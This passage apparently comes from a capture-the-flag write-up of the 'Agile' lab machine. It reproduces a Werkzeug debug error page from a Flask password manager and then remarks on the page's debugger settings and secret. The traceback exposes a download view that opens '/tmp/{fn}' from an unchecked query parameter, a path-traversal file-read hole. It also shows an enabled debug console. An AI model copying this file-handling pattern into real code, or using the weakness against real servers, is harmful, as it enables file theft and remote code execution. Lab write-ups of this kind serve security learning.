</span></span><span class=line><span class=cl>&lt;html lang=en&gt;
</span></span><span class=line><span class=cl>  &lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;FileNotFoundError: [Errno 2] No such file or directory: &#39;/tmp/jsomeone_export_doesnt_exist.csv&#39;
</span></span><span class=line><span class=cl> // Werkzeug Debugger&lt;/title&gt;
</span></span><span class=line><span class=cl>    &lt;link rel=&#34;stylesheet&#34; href=&#34;?__debugger__=yes&amp;cmd=resource&amp;f=style.css&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;link rel=&#34;shortcut icon&#34;
</span></span><span class=line><span class=cl>        href=&#34;?__debugger__=yes&amp;cmd=resource&amp;f=console.png&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;script src=&#34;?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js&#34;&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script&gt;
</span></span><span class=line><span class=cl>      var CONSOLE_MODE = false,
</span></span><span class=line><span class=cl>          EVALEX = true,
</span></span><span class=line><span class=cl>          EVALEX_TRUSTED = false,
</span></span><span class=line><span class=cl>          SECRET = &#34;sSaLzEyA36ncL6OhOEdD&#34;;
</span></span><span class=line><span class=cl>    &lt;/script&gt;
</span></span><span class=line><span class=cl>  &lt;/head&gt;
</span></span><span class=line><span class=cl>  &lt;body style=&#34;background-color: #fff&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;div class=&#34;debugger&#34;&gt;
</span></span><span class=line><span class=cl>&lt;h1&gt;FileNotFoundError&lt;/h1&gt;
</span></span><span class=line><span class=cl>&lt;div class=&#34;detail&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;p class=&#34;errormsg&#34;&gt;FileNotFoundError: [Errno 2] No such file or directory: &amp;#39;/tmp/jsomeone_export_doesnt_exist.csv&amp;#39;
</span></span><span class=line><span class=cl>&lt;/p&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;h2 class=&#34;traceback&#34;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
</span></span><span class=line><span class=cl>&lt;div class=&#34;traceback&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h3&gt;&lt;/h3&gt;
</span></span><span class=line><span class=cl>  &lt;ul&gt;&lt;li&gt;&lt;div class=&#34;frame&#34; id=&#34;frame-140570402696528&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h4&gt;File &lt;cite class=&#34;filename&#34;&gt;&#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;&lt;/cite&gt;,
</span></span><span class=line><span class=cl>      line &lt;em class=&#34;line&#34;&gt;2528&lt;/em&gt;,
</span></span><span class=line><span class=cl>      in &lt;code class=&#34;function&#34;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
</span></span><span class=line><span class=cl>  &lt;div class=&#34;source library&#34;&gt;&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line current&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;raise&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;li&gt;&lt;div class=&#34;frame&#34; id=&#34;frame-140570402693056&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h4&gt;File &lt;cite class=&#34;filename&#34;&gt;&#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;&lt;/cite&gt;,
</span></span><span class=line><span class=cl>      line &lt;em class=&#34;line&#34;&gt;2525&lt;/em&gt;,
</span></span><span class=line><span class=cl>      in &lt;code class=&#34;function&#34;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
</span></span><span class=line><span class=cl>  &lt;div class=&#34;source library&#34;&gt;&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;error: t.Optional[BaseException] = None&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line current&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;li&gt;&lt;div class=&#34;frame&#34; id=&#34;frame-140570402699664&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h4&gt;File &lt;cite class=&#34;filename&#34;&gt;&#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;&lt;/cite&gt;,
</span></span><span class=line><span class=cl>      line &lt;em class=&#34;line&#34;&gt;1822&lt;/em&gt;,
</span></span><span class=line><span class=cl>      in &lt;code class=&#34;function&#34;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
</span></span><span class=line><span class=cl>  &lt;div class=&#34;source library&#34;&gt;&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;request_started.send(self)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line current&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;self,&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;rv: t.Union[ft.ResponseReturnValue, HTTPException],&lt;/pre&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;li&gt;&lt;div class=&#34;frame&#34; id=&#34;frame-140570402699888&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h4&gt;File &lt;cite class=&#34;filename&#34;&gt;&#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;&lt;/cite&gt;,
</span></span><span class=line><span class=cl>      line &lt;em class=&#34;line&#34;&gt;1820&lt;/em&gt;,
</span></span><span class=line><span class=cl>      in &lt;code class=&#34;function&#34;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
</span></span><span class=line><span class=cl>  &lt;div class=&#34;source library&#34;&gt;&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;request_started.send(self)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line current&#34;&gt;&lt;span class=&#34;ws&#34;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;li&gt;&lt;div class=&#34;frame&#34; id=&#34;frame-140570402694960&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h4&gt;File &lt;cite class=&#34;filename&#34;&gt;&#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;&lt;/cite&gt;,
</span></span><span class=line><span class=cl>      line &lt;em class=&#34;line&#34;&gt;1796&lt;/em&gt;,
</span></span><span class=line><span class=cl>      in &lt;code class=&#34;function&#34;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;
</span></span><span class=line><span class=cl>  &lt;div class=&#34;source library&#34;&gt;&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;):&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;view_args: t.Dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line current&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&gt; Response:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;li&gt;&lt;div class=&#34;frame&#34; id=&#34;frame-140570402698880&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h4&gt;File &lt;cite class=&#34;filename&#34;&gt;&#34;/app/venv/lib/python3.10/site-packages/flask_login/utils.py&#34;&lt;/cite&gt;,
</span></span><span class=line><span class=cl>      line &lt;em class=&#34;line&#34;&gt;290&lt;/em&gt;,
</span></span><span class=line><span class=cl>      in &lt;code class=&#34;function&#34;&gt;decorated_view&lt;/code&gt;&lt;/h4&gt;
</span></span><span class=line><span class=cl>  &lt;div class=&#34;source library&#34;&gt;&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;return current_app.login_manager.unauthorized()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;# flask 1.x compatibility&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;# current_app.ensure_sync is only available in Flask &gt;= 2.0&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;if callable(getattr(current_app, &amp;#34;ensure_sync&amp;#34;, None)):&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line current&#34;&gt;&lt;span class=&#34;ws&#34;&gt;            &lt;/span&gt;return current_app.ensure_sync(func)(*args, **kwargs)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;return func(*args, **kwargs)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;return decorated_view&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;li&gt;&lt;div class=&#34;frame&#34; id=&#34;frame-140570402697424&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;h4&gt;File &lt;cite class=&#34;filename&#34;&gt;&#34;/app/app/superpass/views/vault_views.py&#34;&lt;/cite&gt;,
</span></span><span class=line><span class=cl>      line &lt;em class=&#34;line&#34;&gt;102&lt;/em&gt;,
</span></span><span class=line><span class=cl>      in &lt;code class=&#34;function&#34;&gt;download&lt;/code&gt;&lt;/h4&gt;
</span></span><span class=line><span class=cl>  &lt;div class=&#34;source &#34;&gt;&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt;@blueprint.get(&amp;#39;/download&amp;#39;)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt;@login_required&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;&lt;/span&gt;def download():&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;r = flask.request&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line before&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;fn = r.args.get(&amp;#39;fn&amp;#39;)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line current&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;with open(f&amp;#39;/tmp/{fn}&amp;#39;, &amp;#39;rb&amp;#39;) as f:&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;        &lt;/span&gt;data = f.read()&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;resp = flask.make_response(data)&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;resp.headers[&amp;#39;Content-Disposition&amp;#39;] = &amp;#39;attachment; filename=superpass_export.csv&amp;#39;&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;resp.mimetype = &amp;#39;text/csv&amp;#39;&lt;/pre&gt;
</span></span><span class=line><span class=cl>&lt;pre class=&#34;line after&#34;&gt;&lt;span class=&#34;ws&#34;&gt;    &lt;/span&gt;return resp&lt;/pre&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/ul&gt;
</span></span><span class=line><span class=cl>  &lt;blockquote&gt;FileNotFoundError: [Errno 2] No such file or directory: &amp;#39;/tmp/jsomeone_export_doesnt_exist.csv&amp;#39;
</span></span><span class=line><span class=cl>&lt;/blockquote&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;div class=&#34;plain&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;p&gt;
</span></span><span class=line><span class=cl>      This is the Copy/Paste friendly version of the traceback.
</span></span><span class=line><span class=cl>    &lt;/p&gt;
</span></span><span class=line><span class=cl>    &lt;textarea cols=&#34;50&#34; rows=&#34;10&#34; name=&#34;code&#34; readonly&gt;Traceback (most recent call last):
</span></span><span class=line><span class=cl>  File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 2528, in wsgi_app
</span></span><span class=line><span class=cl>    response = self.handle_exception(e)
</span></span><span class=line><span class=cl>  File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 2525, in wsgi_app
</span></span><span class=line><span class=cl>    response = self.full_dispatch_request()
</span></span><span class=line><span class=cl>  File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 1822, in full_dispatch_request
</span></span><span class=line><span class=cl>    rv = self.handle_user_exception(e)
</span></span><span class=line><span class=cl>  File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 1820, in full_dispatch_request
</span></span><span class=line><span class=cl>    rv = self.dispatch_request()
</span></span><span class=line><span class=cl>  File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 1796, in dispatch_request
</span></span><span class=line><span class=cl>    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
</span></span><span class=line><span class=cl>  File &amp;#34;/app/venv/lib/python3.10/site-packages/flask_login/utils.py&amp;#34;, line 290, in decorated_view
</span></span><span class=line><span class=cl>    return current_app.ensure_sync(func)(*args, **kwargs)
</span></span><span class=line><span class=cl>  File &amp;#34;/app/app/superpass/views/vault_views.py&amp;#34;, line 102, in download
</span></span><span class=line><span class=cl>    with open(f&amp;#39;/tmp/{fn}&amp;#39;, &amp;#39;rb&amp;#39;) as f:
</span></span><span class=line><span class=cl>FileNotFoundError: [Errno 2] No such file or directory: &amp;#39;/tmp/jsomeone_export_doesnt_exist.csv&amp;#39;
</span></span><span class=line><span class=cl>&lt;/textarea&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;div class=&#34;explanation&#34;&gt;
</span></span><span class=line><span class=cl>  The debugger caught an exception in your WSGI application.  You can now
</span></span><span class=line><span class=cl>  look at the traceback which led to the error.  &lt;span class=&#34;nojavascript&#34;&gt;
</span></span><span class=line><span class=cl>  If you enable JavaScript you can also use additional features such as code
</span></span><span class=line><span class=cl>  execution (if the evalex feature is enabled), automatic pasting of the
</span></span><span class=line><span class=cl>  exceptions and much more.&lt;/span&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>      &lt;div class=&#34;footer&#34;&gt;
</span></span><span class=line><span class=cl>        Brought to you by &lt;strong class=&#34;arthur&#34;&gt;DON&#39;T PANIC&lt;/strong&gt;, your
</span></span><span class=line><span class=cl>        friendly Werkzeug powered traceback interpreter.
</span></span><span class=line><span class=cl>      &lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &lt;div class=&#34;pin-prompt&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;div class=&#34;inner&#34;&gt;
</span></span><span class=line><span class=cl>        &lt;h3&gt;Console Locked&lt;/h3&gt;
</span></span><span class=line><span class=cl>        &lt;p&gt;
</span></span><span class=line><span class=cl>          The console is locked and needs to be unlocked by entering the PIN.
</span></span><span class=line><span class=cl>          You can find the PIN printed out on the standard output of your
</span></span><span class=line><span class=cl>          shell that runs the server.
</span></span><span class=line><span class=cl>        &lt;form&gt;
</span></span><span class=line><span class=cl>          &lt;p&gt;PIN:
</span></span><span class=line><span class=cl>            &lt;input type=text name=pin size=14&gt;
</span></span><span class=line><span class=cl>            &lt;input type=submit name=btn value=&#34;Confirm Pin&#34;&gt;
</span></span><span class=line><span class=cl>        &lt;/form&gt;
</span></span><span class=line><span class=cl>      &lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;/div&gt;
</span></span><span class=line><span class=cl>  &lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;!--
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Traceback (most recent call last):
</span></span><span class=line><span class=cl>  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 2528, in wsgi_app
</span></span><span class=line><span class=cl>    response = self.handle_exception(e)
</span></span><span class=line><span class=cl>  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 2525, in wsgi_app
</span></span><span class=line><span class=cl>    response = self.full_dispatch_request()
</span></span><span class=line><span class=cl>  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1822, in full_dispatch_request
</span></span><span class=line><span class=cl>    rv = self.handle_user_exception(e)
</span></span><span class=line><span class=cl>  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1820, in full_dispatch_request
</span></span><span class=line><span class=cl>    rv = self.dispatch_request()
</span></span><span class=line><span class=cl>  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1796, in dispatch_request
</span></span><span class=line><span class=cl>    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
</span></span><span class=line><span class=cl>  File &#34;/app/venv/lib/python3.10/site-packages/flask_login/utils.py&#34;, line 290, in decorated_view
</span></span><span class=line><span class=cl>    return current_app.ensure_sync(func)(*args, **kwargs)
</span></span><span class=line><span class=cl>  File &#34;/app/app/superpass/views/vault_views.py&#34;, line 102, in download
</span></span><span class=line><span class=cl>    with open(f&#39;/tmp/{fn}&#39;, &#39;rb&#39;) as f:
</span></span><span class=line><span class=cl>FileNotFoundError: [Errno 2] No such file or directory: &#39;/tmp/jsomeone_export_doesnt_exist.csv&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--&gt;
</span></span></code></pre></td></tr></table></div></div><p>Or, in the browser &ndash; a little more readable:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-16-58-30-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-16-58-30-image.png, /2023-08-06-agile-htb/assets/2023-03-19-16-58-30-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-16-58-30-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-16-58-30-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-16-58-30-image.png width=1168 height=795></p><p>We see in the header tag, the following javascript:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=kd>var</span> <span class=nx>CONSOLE_MODE</span> <span class=o>=</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=nx>EVALEX</span> <span class=o>=</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=nx>EVALEX_TRUSTED</span> <span class=o>=</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=nx>SECRET</span> <span class=o>=</span> <span class=s2>&#34;sSaLzEyA36ncL6OhOEdD&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
